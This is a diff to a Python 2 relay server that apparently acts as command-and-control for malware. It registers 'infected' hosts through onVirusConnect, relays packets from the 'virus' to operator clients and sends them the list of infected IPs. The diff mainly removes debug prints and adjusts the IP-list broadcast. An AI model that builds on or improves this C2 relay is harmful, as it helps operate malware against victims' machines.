@@ -1,7 +1,5 @@
 import socket
 import sys
-import signal
-from PIL import Image
 from StringIO import StringIO
 import threading, time
 from packet import Packet
@@ -48,26 +46,23 @@ class RelayServer:
         ips = ",".join(self.toVirus.keys())
         length = len(ips)
 
-        print length
-
         pkt = Packet()
         pkt.state = state
         pkt.length = str(length)
         pkt.data = ips
-        pkt.returnIP = address[0]
-
-        print pkt
 
         if address != "":
+            pkt.returnIP = address[0]
             self.enqueueToClient(pkt)
         else:
-            for ip in self.toVirus.keys():
+            for ip in self.toClient.keys():
                 self.enqueueToClient(pkt,ip)
 
     def onVirusConnect(self,client,address):
         print address[0] + " infected!"
         q = Queue()
         self.toVirus[address[0]] = (client,q)
+        self.sendIPList()
         threading.Thread(target=self.receiveFromVirus,args=[client]).start()
         threading.Thread(target=self.dequeue,args=[q,client]).start()
 
@@ -75,7 +70,7 @@ class RelayServer:
         while True:
             pkt = Packet()
             pkt.construct(s)
-            print "from virus: " + pkt
+            print "from virus: " + str(pkt)
             self.enqueueToClient(pkt)
 
 
@@ -84,7 +79,6 @@ class RelayServer:
         q = Queue()
         self.toClient[address[0]] = (client,q)
         self.sendIPList(address)
-        print "IPs sent!"
         threading.Thread(target=self.receiveFromClient,args=[client,address]).start()
         threading.Thread(target=self.dequeue,args=[q,client]).start()
 
